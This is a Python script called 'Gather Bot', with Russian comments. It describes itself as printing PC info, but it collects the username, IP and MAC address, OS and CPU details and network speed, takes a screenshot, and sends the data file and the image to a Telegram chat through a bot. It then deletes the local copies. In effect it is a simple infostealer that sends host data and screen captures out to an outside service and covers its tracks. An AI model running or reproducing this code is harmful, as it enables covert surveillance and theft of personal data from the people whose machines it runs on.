# Gather Bot.
# This script prints out info about PC.
#
# Nyukers (C)opyright, 2021.
#
# speedtest -> speedtest-cli
# telebot   -> PyTelegramBotAPI

import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
import speedtest
import telebot
import psutil
import platform
from PIL import Image

bot = telebot.TeleBot("my_token") # Подключение бота Telegram by token

start = datetime.now()  # Начало отсчета

# Username, IP, MAC, OS
name = getpass.getuser()    # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
mac = get_mac()   # MAC адрес
ost = platform.uname()    # Название операционной системы

# Download, Upload, Ping
inet = speedtest.Speedtest()
inet.get_best_server()
download = float(str(inet.download())[0:2] + "." # Входящая скорость
                + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."   # Исходящая скорость
                + str(round(inet.upload(), 2))[1]) * 0.125
#res = inet.results.dict()
#pingme = res["ping"]
#print(res["download"], res["upload"], res["ping"])

# Timezone	
zone = psutil.boot_time()   # Узнает время, заданное на компьютере
time = datetime.fromtimestamp(zone)   # Переводит данные в читаемый вид

# CPU Frequency
cpu = psutil.cpu_freq()

# Screenshot
os.getcwd()
try:    # Перехват ошибки в случае неверно указанного расположения
    os.chdir(r"/temp")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message): # Служебная обвязка для бота
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
screen = pyautogui.screenshot("screenshot.jpg") # Снятие скриншота

ends = datetime.now()   # Конец отсчета
workspeed = format(ends - start)    # Вычисление времени

# Result
try: # Обвязка для обработки команд боту
    os.chdir(r"/temp")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
file = open("info.txt", "w") # Открываем файл
file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
#file.write(f"[================================================]\n  ping: {pingme} msec\n [================================================]\n") 
file.close() # Закрываем

# Bot
text = "Screenshot"   # Требуется при создании скриншота (текст к фото)
@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open("info.txt", "rb")
    bot.send_document(message.chat.id, upfile)
    upfile.close()
    os.remove("info.txt")
#	
    uphoto = open("screenshot.jpg", "rb")
    bot.send_photo(message.chat.id, uphoto, text) 
    uphoto.close()
    os.remove("screenshot.jpg")
#	
    bot.stop_polling()
bot.polling()

    